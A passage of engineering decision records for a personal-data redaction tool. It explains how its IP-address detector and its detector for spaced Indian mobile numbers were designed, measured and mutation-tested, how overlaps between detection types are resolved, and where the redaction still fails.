## ADR-026: IP detection — one type, a hand-written parser, addresses no single host owns are kept

**Context:** Phase 5b, the last detector (ADR-021 item 7: one `IP` type
for IPv4 and IPv6, amending ADR-003's separate `IPv6 > IPv4`). The user's
brief for this part, 2026-10-01: a hand-written parser, no new
dependency; decide by measurement on the generated set whether private,
loopback, link-local and documentation addresses are redacted, and record
why; measure the false positives on versions (four parts of 0–255,
`10.0.19045.3693`), times, dates, MAC addresses and hex strings that parse
as IPv6; say what is redacted in each written form (port, CIDR, URL,
IPv6 in brackets, compressed, zone, IPv4-mapped); and settle the overlaps
with NUMBER, PHONE and SECRET, IP's place in the priority and its
placeholder. Tune only on the generated set; held-out numbers are for
reporting.

Before this, 80 of the 153 generated addresses were redacted, none as IP:
the ones with 9+ digits by the safety net, a few by PHONE.

An address is personal data because an ISP can tell whose connection it
was at a given time. A private address identifies a device inside one
network, a link-local IPv6 address can carry the device's MAC address, a
carrier-grade NAT address (100.64/10) identifies a subscriber to the
carrier. Loopback, the unspecified address, multicast groups and
netmasks are the same on every machine and identify nobody.

**Decision:**

1. **The parser** (`src/detection/ip.ts`). The text is cut into maximal
   runs of hex digits, colons and dots, each read once, whole: a run is
   an IPv4 address (four decimal parts, each 0–255, leading zeros
   allowed), or an IPv6 address in an RFC 4291 text form (eight groups of
   1–4 hex digits, or fewer with one `::` standing for at least one zero
   group, optionally ending in an IPv4 part). If it is neither, each
   colon-separated part is tried as an IPv4 address: that finds one with
   a port (`203.0.113.5:8080`) or after a hex-digit label (`add:…`,
   `1:…`). Reading whole runs is what keeps a MAC address (six groups), a
   time (`12:30:45`) or a 16-pair key fingerprint from ever being read as
   an address, or searched for one inside. A run starting inside a word
   is read from its first colon (`src:203.0.113.5`); one glued to a word
   with no colon is not an address (`v1.2.3.4`). Not glued to a letter,
   digit, mark or underscore, nor to `@` after it (an email's or UPI ID's
   local part); `@` before is fine (`root@203.0.113.5`). A run ending in a
   dot and then a letter or digit is a host name, not an address. Leading
   and trailing dots and a label's or sentence's colon are trimmed. Linear
   time; no length cap is needed (no string over 45 characters parses).
2. **What is taken in each form** (brief item 3; every row pinned in
   `ip.test.ts`, "forms: only the address is redacted"): only the address.

   | Written as                                  | Redacted               | Left as written   |
   | ------------------------------------------- | ---------------------- | ----------------- |
   | `203.0.113.5:8080`                          | `203.0.113.5`          | `:8080`           |
   | `10.0.0.0/8`, `203.0.113.9/24`              | the address            | `/8`, `/24`       |
   | `http://203.0.113.5/path`                   | the address            | scheme and path   |
   | `[2001:db8::1]:443`                         | `2001:db8::1`          | brackets and port |
   | `2001:db8::1`, `2001:db8::`                 | the whole address      |                   |
   | `fe80::1%eth0`                              | `fe80::1`              | the zone `%eth0`  |
   | `::ffff:203.0.113.5`, `64:ff9b::192.0.2.33` | the whole address      |                   |
   | `::1`, `::`, `ff02::1`, `::ffff:127.0.0.1`  | nothing (kept, item 4) | all               |

   A port, prefix length or zone names nobody, and the model needs them to
   answer network questions. Exception, measured: when an address and its
   prefix length together also read as a valid phone number (the digits of
   `203.0.113.9/24` are a Pune landline to libphonenumber), the longer
   validated phone wins by length and `203.0.113.9/24` is redacted as
   PHONE, prefix and all. 4 of the 153 generated addresses are written
   that way; still redacted, typed wrong. Pinned as a known limit
   (containing span, 5c).

3. **Validated** (ADR-010): an IPv4 address, unless a version word comes
   right before it (whole word `version`, `ver`, `v`, `build`,
   `release`, `firmware`, `fw`, `rev`, `revision`, संस्करण, वर्जन, then at
   most a dot, three spaces or tabs, one of `:=#`); an IPv6 address with a
   group of 3–4 hex digits or an IPv4 part. **Unvalidated**, accepted only
   near an IP keyword (`context.ts`: ip, ips, ipv4, ipv6, inet, inet6,
   आईपी): the version-worded IPv4, and IPv6 made only of one- or two-digit
   groups (`a::b`, `10::20`, eight pairs of hex digits), which is also
   what scoped names in code and EUI-64 interface ids look like.
4. **Which ranges (brief item 1): every address is redacted except those
   no single host owns**, which are kept: 0/8 (unspecified, "this
   network", Cisco wildcard masks), 127/8 (loopback), 224/4 (multicast),
   240/4 (reserved, the broadcast address, every netmask from /4 up), and
   in IPv6 `ff00::/8`, with an IPv4 address carried in IPv6 (mapped
   `::ffff:0:0/96`, and the deprecated "IPv4-compatible" `::/96`, which
   also holds `::` and `::1`) judged by its IPv4 part. Private (RFC 1918,
   `fc00::/7`), carrier-grade NAT, link-local (169.254/16, `fe80::/10`)
   and documentation addresses are redacted like public ones. Measured on
   the generated set after the first dataset step (below), each row
   changing only which ranges the detector skips:

   | Policy                              | IP redacted | IP right type | IP over-redactions | Private lookalikes (25)                            | Link-local (14)                          | Loopback (7) |
   | ----------------------------------- | ----------- | ------------- | ------------------ | -------------------------------------------------- | ---------------------------------------- | ------------ |
   | V1 redact every address             | 153/153     | 152/153       | 68                 | 25 by IP                                           | 14 by IP                                 | 7 by IP      |
   | **V2 skip no-single-host (chosen)** | 153/153     | 152/153       | 61                 | 25 by IP                                           | 14 by IP                                 | 0            |
   | V3 V2 + skip private                | 153/153     | 152/153       | 36                 | **23 still redacted** (PHONE 6, NUMBER 17), 2 sent | 14 by IP                                 | 0            |
   | V4 V3 + skip link-local             | 153/153     | 152/153       | 22                 | 23 (as V3)                                         | **6 still redacted** (PHONE 5, NUMBER 1) | 0            |
   | V5 V4 + skip documentation          | 80/153      | 0/153         | 22                 | 23 (as V3)                                         | 6 (as V4)                                | 0            |

   Why V2. (a) Loopback: redacting it costs 7 over-redactions and hides
   nothing (V1). (b) Private: skipping them in the IP detector does not
   keep them visible; the phone detector and the safety net still take 23
   of 25, as a "phone number" or a "number", and whether one is sent
   depends only on its digit count (`10.0.0.1` has 5, `10.123.145.167`
   has 11). Keeping them visible for real would need a claim that also
   holds off every other detector: a fail-open path, for addresses that
   are private but not nobody's. (c) Link-local, the same, 6 of 14, and an
   IPv6 one can carry a MAC address. (d) Documentation: the generated set
   uses them for public addresses (they are the only ones that may be
   typed or generated, ADR-009), so skipping them measures nothing (V5);
   in real text they are examples, cheap to redact. Cost of V2, measured
   below: every private and link-local lookalike is an over-redaction, and
   the model cannot reason about whether two addresses share a network.

5. **Kept addresses claim their text, without costing a neighbour its
   detection.** A kept address is reported with `keep: true` and takes no
   part in overlap resolution. After it, a detection whose span is exactly
   a kept address is dropped (without this, the SSDP multicast address
   is typed AADHAAR: its 12 digits pass Verhoeff; and
   `255.255.255.0` is a validated PHONE), and a kept address that no
   detection touches is held back from the safety net
   (`255.255.255.255` would be a NUMBER). A detection that reaches past
   the address stays and takes the address with it. The first version let
   kept addresses win overlaps and sent a phone number (bug-log 31). The
   fail-open cost: text that is exactly a kept address is never redacted
   by any type, even if it were somebody's number written as a dotted
   quad of those ranges; nobody writes an Aadhaar or a phone in 3-3-3-3
   dotted groups.
6. **Priority: IP first** (brief item 4; ADR-003 amendment). The type
   order only decides between candidates with the same validation and
   length, and only three types can cover exactly an address's text:
   AADHAAR and PHONE (its digits read as a number) and SECRET. Measured:
   with IP where ADR-003 listed it (after EMAIL), **30 of 153** generated
   IPv4 addresses were typed PHONE, a tie on exactly the same span (155 of
   the 254 hosts in `203.0.113.0/24` are valid Pune landlines to
   libphonenumber); of 8,280 dotted quads `200–223.1xx–2xx.1xx–2xx.123`,
   **808 (9.8%)** pass the Aadhaar checks as a whole run (Indian mobile
   carriers' addresses often have this 3-3-3-3 shape). A dotted quad with
   every part ≤ 255 is the likelier reading in every such tie. With IP
   first: 152/153 right type (the other is the prefix-length case of item
   2). IP cannot tie with CARD (13+ digits), PAN, IFSC, UPI or EMAIL
   (letters, `@`), so first or anywhere above AADHAAR gives the same
   result; first is simplest to state.
7. **Widening** (ADR-010 amendment): an IP detection is widened to digit
   runs like every other, so a phone reading that starts inside an
   address (`3 <mobile>`, libphonenumber taking the address's last digit)
   is covered by the winner (bug-log 31: exempting IP from widening sent
   the mobile). Except over a first digit group glued to a letter: in
   `IPv4 203.0.113.5` the `4` is part of a word (`widenAddress` in
   `detect.ts`); a long glued group is still the safety net's
   (`ref1234567890 10.1.2.3` gives NUMBER and IP).
8. **Placeholder `[IP_1]`; value key** (ADR-013): the canonical address,
   so `192.168.001.010` and `192.168.1.10`, `2001:DB8::1` and
   `2001:db8:0:0:0:0:0:1`, `::ffff:203.0.113.5` and `203.0.113.5` are one
   placeholder each, restored as first written. A detection widened past
   its address is keyed by its text. Restoration needs no change: the
   grammar comes from `DETECTION_TYPES`; `IP` is restored from `[IP_1]`,
   `IP_1` and `Ip_1`, never the bare-space form; `MAX_HELD_BACK` is
   unchanged. **Cost, pinned in `round-trip.test.ts`:** the restoration
   safety rule (ADR-018) keeps a placeholder inside a URL the model writes
   (`http://[IP_1]/admin`), so an answer about a URL on an address shows
   the placeholder. That is the rule working, not a bug.
9. **Hygiene and the held-out lint.** `repo-hygiene.test.ts` now fails on
   any typed address outside the ranges nobody can be found at (the
   lint's own `isSafeIp`, tried on the address as written and in its
   canonical form); `eval/held-out.txt` is left to its lint (its author
   may type a short dotted number, and a hit would point into a file the
   detectors' author must not look at). `isSafeIp` now also accepts the
   kept ranges and an IPv4 address carried in IPv6; `HELD-OUT-FORMAT.md`
   says so. The check found 16 lines on its first run: artifacts of
   reading source code (a test name, a regex, an RFC section number that
   is a dotted quad), public boundary addresses in lint tests, and the
   SSDP address, which also trips the existing Aadhaar rule. Public
   addresses and the SSDP address are now put together at run time.

**Overlaps, with examples** (brief item 4; each pinned in `ip.test.ts`,
"IP next to the other types", or `phone.test.ts`):

- _NUMBER_: an address of any length is IP's; the net never sees it.
  Digits joined by a space are taken into the IP detection by widening
  (`10.1.2.3 4567`: over-redaction); two addresses joined by a space or
  hyphen share one placeholder (widening merges neighbours, 5c); a comma
  keeps them apart. Kept addresses of 9+ digits are held back from the
  net. A Windows build number (`10.0.19045.3693`: 19045 > 255) is not an
  address; the net takes it (18 of 18 generated ones).
- _PHONE_: an address beats an exact-span phone reading (item 6); a
  longer phone reading of address + prefix beats the address (item 2);
  a phone reading starting inside an address is covered by the widened
  address (item 7). Found here, not caused by IP: a spaced mobile right
  after a lone digit and a space is not detected without a keyword, also
  after a kept address (`127.0.0.1 <mobile>`; bug-log 32, 5c).
- _AADHAAR_: a 12-digit dotted quad that passes the Aadhaar checks is IP
  (property test over generated ones).
- _SECRET_: `password: 10.1.2.3` is IP (validated beats unvalidated),
  whole. `token: a::b` is the SECRET (the short-group IPv6 is unvalidated
  and "token" is not an IP keyword). `api_key=10.1.2.3-x7`: the address
  wins over the longer unvalidated secret and `-x7` is sent; the ADR-003
  containing-span question, pinned as a known limit.
- _EMAIL_: `10.1.2.3@example.com` and `x.10.1.2.3@example.com` are the
  email's, whole (`@` after is glue; `x.` makes the run start inside a
  word). `a@[203.0.113.5]` is not an email to the email detector (IP
  literals are a documented email gap); the address inside is IP.
- _UPI_: `10.1.2.3@<known handle>` is one UPI ID.
- _IFSC, PAN_: no text can be both (letters).

**Lookalikes (brief item 2), measured.** The generated set already had
four-part versions with no word in front (`#.#.##.#`), private and
loopback addresses. Two dataset steps added more, each measured with the
detectors unchanged first and recorded with `--accept`, so every count
that moved there is the dataset's:

- step 1: IP written with a port, a prefix length, in a URL and in
  brackets with a port; `NOT.link-local`, `NOT.version-build`
  (`10.0.#####.####` after "build" or "Windows"), `NOT.app-version`
  (`#.#.#.##` after "version", "ver.", "app version", or glued to "v"),
  `NOT.time`, `NOT.date` (dotted), `NOT.mac`, `NOT.eui-64` (eight pairs,
  a well-formed IPv6 address);
- step 2, added when item 5 was designed: `NOT.netmask` and
  `NOT.multicast` (the SSDP address, mDNS, all-hosts, `ff02::1`).

| Lookalike (in the set)                   | Redacted before IP (step 2)       | Redacted with IP                  |
| ---------------------------------------- | --------------------------------- | --------------------------------- |
| `link-local` (17)                        | 6 (PHONE 3, NUMBER 3)             | 17, by IP (redacted on purpose)   |
| `private-ip` (14)                        | 14 (PHONE 3, NUMBER 11)           | 14, by IP (redacted on purpose)   |
| `loopback` (14)                          | 0                                 | 0 (kept)                          |
| `version`, bare four parts (20)          | 0                                 | 20, by IP (the accepted cost)     |
| `app-version`, after a version word (15) | 0                                 | 0                                 |
| `version-build`, `10.0.#####.####` (18)  | 18 (NUMBER)                       | 18 (NUMBER; not an address)       |
| `time` (16)                              | 0                                 | 0                                 |
| `date`, dotted (16)                      | 1 (PHONE)                         | 1 (PHONE)                         |
| `mac` (16)                               | 0                                 | 0                                 |
| `eui-64`, eight pairs (17)               | 0                                 | 2, by IP (an IP keyword was near) |
| `netmask` (15)                           | 11 (AADHAAR 1, PHONE 6, NUMBER 4) | 0 (kept)                          |
| `multicast` (27)                         | 8 (AADHAAR 6, PHONE 2)            | 0 (kept)                          |

The `app-version` lookalikes were written together with the version rule,
so that row shows the rule works, not how often a version word is there
in real text. The bare versions cannot be told from addresses (3.x and
4.x are cloud providers' ranges) and are redacted: the accepted cost.

**Measured (2026-10-01, `npm run eval`; the README block's date is UTC):**

|                                                        | Before (step 2 dataset, IP off) | With the IP detector                                             |
| ------------------------------------------------------ | ------------------------------- | ---------------------------------------------------------------- |
| Generated, IP redacted                                 | 76/153                          | 153/153, 0 partly                                                |
| Generated, IP right type                               | 0/153                           | 149/153                                                          |
| Generated, IP precision                                | -                               | 149/202 (73.7%)                                                  |
| Generated, IP over-redactions                          | 0                               | 53 (link-local 17, private 14, bare versions 20, EUI-64 pairs 2) |
| Generated, over-redactions by AADHAAR / PHONE / NUMBER | 10 / 60 / 84                    | 3 / 46 / 66                                                      |
| Held-out, IP redacted                                  | 1/2                             | 2/2 (right type 2/2)                                             |
| Held-out, IP over-redactions                           | 0                               | 2 (one lookalike, one in plain text)                             |

**When the held-out number was seen:** the very first evaluation run with
the detector (before the priority change, the forms fix, the widening and
keep designs) printed the held-out table: IP 2/2 redacted, 2/2 right
type, 2 over-redactions. Every run after that until the detector was
final scored the generated set only (a scratch scorer that never loads
the held-out file), and the final run shows the same held-out counts. No
change was made to move them; the held-out over-redaction in plain text
was not looked into.

**Found by reading, before any test ran:** a run such as `add:203.0.113.5`
or `1:203.0.113.5` was first read only whole, failed as both IPv4 and
IPv6, and the address (8 digits, under the safety net) would have been
sent; the colon-separated parts are now tried (item 1). No bug-log entry:
it never ran.

**Options considered and rejected:**

- _A dependency_ (`ipaddr.js`, Node's `net.isIP`). The brief ruled out a
  dependency; `net.isIP` validates a given string but does not find
  addresses in text, and rejects leading zeros, which people type.
- _Separate IPV4 and IPV6 types_ (ADR-003 as first written). One type is
  one placeholder namespace and one priority; an IPv4 address inside an
  IPv6 one is the same host (item 8).
- _Keep private addresses visible_ (V3), and _redact every address_ (V1):
  item 4.
- _A negative keyword list for versions applied to everything_, or
  guessing from the numbers (small parts, a first part under 10). Real
  public ranges start with 1–9; only a word in front is evidence.
- _Include the prefix length in the IP span_ so that it ties with the
  phone reading of item 2. It would hide `/8` and `/24` everywhere to fix
  4 of 153 type labels.
- _Exempt IP from widening_ (tried; bug-log 31).

**Consequences and known limits:**

- Private and link-local addresses are over-redacted by design; the model
  cannot compare networks. Bare four-part versions are over-redacted.
- An address inside a host name (`203.0.113.5.nip.io`, reverse-DNS names,
  `ec2-203-0-113-5…`) is not found.
- Address + prefix read as a phone: typed PHONE, prefix included.
- Two addresses joined by a space or hyphen share a placeholder (5c).
- `api_key=<address>-x7` keeps only the address (containing span, 5c).
- A hex word glued by a colon before an IPv6 address goes with it
  (`cafe:` before `2001:db8::1`): over-redaction.
- A placeholder in a URL the model writes stays a placeholder (ADR-018).
- MAC addresses are not a detected type and are sent as written.
- ADR-013's literal-overlap filter stays unreachable: an address cannot
  contain `[` or `]` (brackets end a run).

  > **Correction (2026-10-03, bug-log 58):** the conclusion is wrong. An
  > address detection itself still never overlaps a literal (probed with
  > `[PAN_1]` glued before and after IPv4 and IPv6 addresses), but an
  > address right after `[PAN_1]` makes the safety net take the literal's
  > `1` as digits joined to it (ADR-029), and that NUMBER overlaps the
  > literal; keyword secrets, emails and glued numbers reach it too. The
  > overlapping detection was dropped whole and its value sent. See
  > bug-log 58 and [ADR-037](#adr-037).
  > **Fixed the same day:** such a detection is now cut around the literal,
  > never dropped (bug-log 58).

**Mutation checks:** 52, one at a time with the 15-minute limit (the
testing guide has the table). The first run was cut off by a usage limit
and left I6 written into `ip.ts` (bug-log 24, second time); P1–P11 and
I1–I5 had finished in it, the rest were run the next session with the
runner now in the repo, and then all 52 again against the final tests.
**51 caught**, 9 of them only after a test was added: I2 (a four-digit
first part), I4 (`source:2001:db8::1`: a run starting inside a word read
whole is a valid IPv6 address there), I7 and I9 (an IPv6 address after a
lone colon and before a sentence's colon: equivalent for IPv4, a leak for
IPv6), S1 (eight groups and a `::`), S3 and K7 (the "not an address" and
"kept" tests could not tell a kept or an unvalidated candidate from none:
they now assert no candidate of either kind, and the kept rows are also
checked next to an IP keyword), S6 (an IPv4 part after short groups only),
P9 (a kept address must change nothing about a detection reaching into it:
found by fuzzing a mutated copy, 76 of 300,000 inputs differed). **V5 is
equivalent**: reading the whole text before the address instead of a
32-character window gives the same matches and, measured, the same time
(10.0 ms against 11.6 ms at 400,000 characters): V8 does not scan the
prefix for this end-anchored pattern. The window stays, so the code does
not depend on that.

<a id="adr-027"></a>

## ADR-027: Spaced mobiles beside other digits — look inside the run; tables decided by the same two columns

**Context:** bug-log 34 (and 32, one case of it). libphonenumber reads a
stretch of digit groups joined by spaces as one candidate; when the whole
stretch is not a valid number it reports nothing and does not look
inside. So a mobile written 5 + 5 with another digit group beside it was
sent as written, keyword or not: two spaced mobiles side by side, a PIN
code after it, `24x7` after it, a lone digit before it (`Room 3 …`), and
every mobile of a contact sheet (a label and two spaced mobiles per row).
The safety net does not join across spaces (ADR-011). Phase 5c item 1.

**Options** (measured on copies of `src/detection` in the session
scratchpad, on probe sets of synthetic data and on the generated set;
"tables" means messages of 3 to 8 rows of amounts, 200 per layout, where
every detection is an over-redaction):

| Option | Rule for a 5 + 5 pair inside a longer run                                                                                             | Result                                                      |
| ------ | ------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------- |
| PH1    | any valid Indian number                                                                                                               | too loose (landlines in amount tables)                      |
| PH2    | libphonenumber type MOBILE                                                                                                            | as PH3, with more cost                                      |
| PH3    | valid and starting 6–9                                                                                                                | every bug-34 shape found; tables 508 / 732 / 741 detections |
| PH4    | PH3, only with a keyword                                                                                                              | contact sheets still sent (0 of 4,316)                      |
| PH5    | PH3, but a run with 3+ groups of one length needs a keyword                                                                           | cannot tell two mobiles from a table row: 866 of 2,200      |
| PH6    | PH3, but a message with 3+ numeric lines needs a keyword                                                                              | contact sheets 400 of 4,316                                 |
| PH7    | PH6, unless the same columns are a mobile on every row                                                                                | as PH8, but only from 3 rows                                |
| PH8    | PH3; in a message with 2+ numeric lines (2+ groups of 3+ digits), only if the same two columns are a 6–9 mobile on every numeric line | approved first; see bug-log 37                              |
| R1     | PH8, comparing only lines with the same number of groups                                                                              | multi-line text 528 of 1,500                                |
| R2     | R1, and 5-digit groups at the pair's positions                                                                                        | multi-line 1,500 of 1,500; label tables 170 in 87           |
| **R3** | PH3; the pair needs a keyword only if another line has two 5-digit groups at the same two positions that are not a 6–9 mobile         | **chosen**                                                  |

PH8 was approved on the first measurements. Implemented, it matched its
prototype on every probe set and on 50,000 fuzzed texts, and then the
no-leak test found that it does nothing in a message with any other line
holding two groups of 3+ digits (`Order 12345 placed on 2026-09-28`, an
address with a PIN code, the `000` of an Indian amount): 0 of 1,500
spaced mobiles redacted in such messages, as before the fix (bug-log 37).
R1 to R3 were measured on all the same probe sets plus that one; the user
chose R3 (2026-10-01).

**Decision:**

1. **Where** (`src/detection/spaced-mobile.ts`, called at the end of
   `phoneCandidates`): every window of two 5-digit groups inside a longer
   run (`digitWindows`, so the glue rules are the Aadhaar and card
   detectors': not after a letter, digit, `@` or `+` at the start of the
   run, not before a letter, digit or `@` at its end). A window that is a
   whole run stays libphonenumber's.
2. **Which pairs:** a valid Indian number (libphonenumber, `IN`) whose
   first digit is 6–9, the mobile ranges. With today's metadata every
   10-digit number starting 6–9 is valid (0 of 40,000 five-digit prefixes
   is not), so the validity check changes nothing now; it stays because
   the brief says "valid" and the metadata updates with patch releases
   (ADR-004). Mutation S6 is equivalent for that reason.
3. **Tables (R3):** groups are numbered on each line from its start,
   counting every group of digits (a lone digit, the `91` of `+91`).
   Lines end at LF, CR, VT, FF, NEL, U+2028 and U+2029. If any line has
   two 5-digit groups at the pair's two positions that are not a 6–9
   mobile, the pair is in a table of numbers: it is an unvalidated
   candidate, accepted only with a phone keyword nearby (ADR-010).
   Otherwise it is validated. A contact sheet has mobiles in every row of
   its columns and passes; an amount table almost never does; a line that
   does not have two 5-digit groups there (a date, an address, an
   Aadhaar, an amount with commas) is not part of that table.
4. **Linear time:** the lines and groups are read once, and every pair of
   neighbouring 5-digit groups is checked once, only when the text has a
   candidate at all. Each check is one libphonenumber call (about 0.05
   ms), so the fail-fast timing tests (ADR-023) are sized per input: 2,000
   to 4,000 characters for text full of mobiles, 32,000 for an amount
   table.

**Measured** (the previous session's probe sets, re-run with the
implementation, plus the multi-line set; values redacted whole / partly /
not at all):

|                                    | Today             | PH8           | R3             |
| ---------------------------------- | ----------------- | ------------- | -------------- |
| bug-34 shapes, no keyword          | 268 / 134 / 1,798 | 2,200 / 0 / 0 | 2,200 / 0 / 0  |
| bug-34 shapes, with keyword        | 1,005 / 4 / 1,191 | 2,200 / 0 / 0 | 2,200 / 0 / 0  |
| contact sheets (two headers)       | 0 of 4,316        | 4,316         | 4,316          |
| multi-line messages, no keyword    | 6 of 1,500        | 6 of 1,500    | 1,500 of 1,500 |
| sheet with one "+91" row, 2–5 rows | 0%                | 40–82%        | 100%           |
| sheet with one missing cell        | 1,500 of 8,500    | 8,500         | 8,500          |
| generated main set                 |                   | no change     | no change      |

Costs, as detections in 200 messages of text with nothing personal:

| Table layout                                                  | Today      | PH8        | R3         |
| ------------------------------------------------------------- | ---------- | ---------- | ---------- |
| row number + two amounts (`12 34567 89012`), 3–8 rows         | 116 in 94  | 122 in 96  | 149 in 104 |
| three 5-digit amounts per row                                 | 4 in 4     | 43 in 15   | 43 in 15   |
| a label, some with a digit (`Q1`), + three 5-digit amounts    | 5 in 5     | 33 in 12   | 130 in 68  |
| two rows of three 5-digit amounts                             | 1 in 1     | 151 in 76  | 151 in 76  |
| two rows, row number + two 5-digit amounts                    | 25 in 25   | 80 in 51   | 80 in 51   |
| two 5-digit amounts per row (the existing ADR-010 cost)       | 763 in 198 | 763 in 198 | 763 in 198 |
| amounts with commas, western or Indian, with or without paise | 0          | 0          | 0          |
| plain 6-digit amounts                                         | 10 in 10   | 10 in 10   | 10 in 10   |

Generated set (eval): main cases unchanged; shape block side-by-side
68 → 80 of 80, digit-beside 13 → 40 of 40, and two new shapes added for
this item in their own dataset step with the detector switched off
(ADR-021 amendment below): contact-sheet 0 → 120 of 120,
misaligned-sheet 12 → 132 of 132. Held-out set: no count changed.

**Consequences:**

- Every bug-34 shape is found without a keyword, and contact sheets,
  aligned or with one row out of line, are redacted whole.
- Over-redaction rises in tables of 5-digit amounts: about one message in
  thirteen with three amounts per row, one in three with two rows of
  them, and one in three when some row labels contain a digit (`Q1`),
  because such a row's last pair sits where no other row has two 5-digit
  groups. Amounts written with commas are not affected. The README's
  known costs list these.
- The `000` of an Indian amount or a 4-digit year never counts against a
  pair: only 5-digit groups do.
- Known limits, each pinned by a test: a mobile after a token ending in a
  digit and `x` (bug-log 36, libphonenumber's extension reading; to be
  fixed later, the user's choice); two values of other types side by
  side (bug-log 35, items 2 and 3); widening still merges neighbours
  into one detection (item 2).

**ADR-021 amendment (dataset):** the shape block gains `contact-sheet`
(21 sheets: a header with or without a keyword, then 2 to 5 rows of a
label and two spaced mobiles, one or two spaces between; 120 values) and
`misaligned-sheet` (24 sheets of 2 to 4 rows, half with one row starting
`+91`, half with one row missing a mobile, left out or marked `-`; 132
values). They come last in the block's random stream, so all 1,091
earlier cases render byte for byte as before (checked by hash). Accepted
as a changed dataset with today's detectors. A first version gave the
"+91" kind only 2- and 4-row sheets and the missing kind only 3-row ones;
it was replaced before its acceptance was committed.

**Mutation checks:** 25, one at a time with the committed runner (15-minute
limit; the testing guide has the table). **23 caught**, S1 (the detector
switched off) and S8 (no pair validated) by both no-leak blocks as well,
S11 by the streaming one; the three quadratic mutants (S17 to S19) by the
fail-fast timing tests in 7 to 19 s. **Two are equivalent:** S6 (no
validity check: every 10-digit number starting 6–9 is valid in today's
metadata, see decision 2) and S4 (windows of more than two groups
allowed: the pair is then a 5-digit group and a shorter one, a 7- to
9-digit number libphonenumber never accepts; 0 of 300,000 random runs of
such groups gave a different result).

<a id="adr-028"></a>

## ADR-028: Widening stops at the neighbouring detection (amends ADR-010)

**Context:** ADR-010's fail-closed rule widens every detection to the whole
digit runs it touches, so no part of a longer number is left visible. Its
open issue: a run can hold two values (`<mobile> <mobile>`, `<IFSC>
2001:db8::…`, `10.1.2.3 10.4.5.6`). Widening one over the other made the
two overlap, and the second overlap pass then kept only one: either both
values went into one detection and one placeholder (the placeholder then
depends on the neighbour, and the model sees one value where there were
two), or, when the other value reached beyond the run (an IPv6 address,
a UPI ID, a secret), the loser's text outside the run was sent (bug-log
35: an IFSC next to an IPv6 address lost in 80 to 89 of 200 pairs).
Phase 5c item 2; the user approved "widen only up to the neighbouring
detection" in the 5c plan, measured in the previous session as W1.

**Decision:** after the first overlap resolution (types decided, winners
sorted and not overlapping), each winner is widened to the digit runs it
touches as before (an IP address with ADR-026's glued-first-group rule),
but its start never goes below where the previous widened detection ends,
and its end never goes past where the next winner starts. The digits
between two values therefore go to the first of them: nothing is left
visible and no detection is dropped. Where such a cut falls, the run
separators next to it (space, dot, hyphen, dashes) are trimmed off, so they
stay text: `[PHONE_1] [AADHAAR_1]`, not `[PHONE_1][AADHAAR_1]` with the
space inside the first value. The second overlap pass is gone; it can no
longer find anything.

**Measured** (copies of `src/detection` at HEAD and with the change):

|                                                                                                                                                                  | HEAD                 | Now                                            |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------- | ---------------------------------------------- |
| Generated set (main + shape block), detections holding two personal values                                                                                       | 160 (320 values)     | 28 (56 values)                                 |
| Same, values redacted / partly / missed                                                                                                                          | 1,875 / 103 / 816    | the same                                       |
| Pair probes, 100 per row: phone + phone (space), Aadhaar + phone (any separator), unbroken phone + Aadhaar (space, `" - "`, `". "`), card + card (space, hyphen) | merged in every pair | merged in none                                 |
| Aadhaar + Aadhaar, four separators                                                                                                                               | merged in every pair | merged in 7 to 27                              |
| Bug-35 pair probe (10 types × 10 types × 4 separators, 200 each), rows with any leak                                                                             | 69                   | 37                                             |
| Eval, shape block side-by-side, right type                                                                                                                       | 60 of 80             | 66 of 80                                       |
| Eval, main cases                                                                                                                                                 |                      | unchanged                                      |
| Held-out set                                                                                                                                                     |                      | PHONE precision 17/18 → 18/19 (reporting only) |

Every row the bug-35 probe lost is a space- or dot-separated pair of IFSC,
IP, UPI or SECRET, and IFSC + IP with a hyphen.

**Consequences:**

- Two values in one run keep two placeholders and their separator.
- What still merges is not widening: (1) overlap resolution can pick a
  window that straddles two values, because "longer wins" counts
  characters and a window across `-` is longer than either value
  (phone + phone with `" - "` 53 of 100, with `". "` 36; Aadhaar pairs 7 to
  27); (2) the safety net joins digits across a hyphen, so two unbroken
  numbers joined by `-` are one NUMBER. Both are redacted whole; they are
  item 3 (the overlap rule and joined digits).
- Bug 35 is fixed only for the widening cause. Still open: after a hyphen,
  an email, UPI ID or JWT that follows another value (its pattern takes the
  hyphen and loses the overlap, or never starts); an IP after a UPI ID's
  hyphen; and a new cause found here, a 16-digit window across a number and
  the first group of an IPv6 address (`<Aadhaar>. 2001:db8::…`) that passes
  Luhn as a card and wins the overlap, so the rest of the address is sent
  (3 of 200 pairs with `" - "` or `". "`, 1 of 200 after a long number).
  Item 3 takes all three. PAN or secret then phone is bug 36, not 35.

**Mutation checks:** 11, with the committed runner. **11 caught**; W9 and
W11 (trimming separators into the value's own end or start) only after a
test was added for passwords that end or start with a hyphen or dot. W1
and W7 (widening into the neighbour) also fail both no-leak blocks.

**ADR-004 amendment (2026-10-01, bug-log 36):** the extension markers
blanked in libphonenumber's copy of the text (bug 7) now include one right
after a digit (`…1234X`, `9xt`, `5ext`, `7X-`), not only one that stands
alone: libphonenumber read it as an extension and then reported nothing for
a spaced number after it (every spaced format, 200 of 200). A marker
followed by a letter or digit (`24x7`, `6789x123`) is still left alone.
Measured against the alternative (spaced-mobile.ts taking whole 5 + 5
runs): this fixes every spaced format, the alternative only 5 + 5 mobiles;
neither changed the generated set, the shape rows, amount tables, plain
text or multi-line messages.

<a id="adr-029"></a>

## ADR-029: Overlaps — the containing span, what losers leave, joined digits, and values glued together (amends ADR-003, ADR-011, ADR-022, ADR-024)

**Context:** Phase 5c item 3. The approved plan named the containing span
(ADR-003's open concern: `<PAN>.x@example.com`, `api_key=<IFSC>-x7`,
`token: abc-<mobile>` kept only the checked value and sent the rest) and
digits joined to a detection by a bracket or `+` (`<mobile>(12345` sent
`12345`). The user added (2026-10-01): bug 35 must be fully fixed by the
end of this item, including the card-into-IPv6 cause found in item 2 and
the `<mobile> - <mobile>` merge, and the no-leak test must then plant
mixed-type pairs with all four separators, with no exceptions.

Measured before (HEAD, the bug-35 pair probe: every type then every type,
four separators, 200 pairs each): 29 rows leaked, 2,626 values in all.

**Options:** prototyped on copies of `src/detection` and measured on the
pair probe, a secret-pair and an email/UPI-pair probe, the generated set
(main and shape block), the merge probe, 12 kinds of plain text, 9
amount-table layouts, the bug-34 shapes and multi-line messages.

| Rule                | What it does                                                                  | Pair probe rows left (cumulative)                                                              |
| ------------------- | ----------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------- |
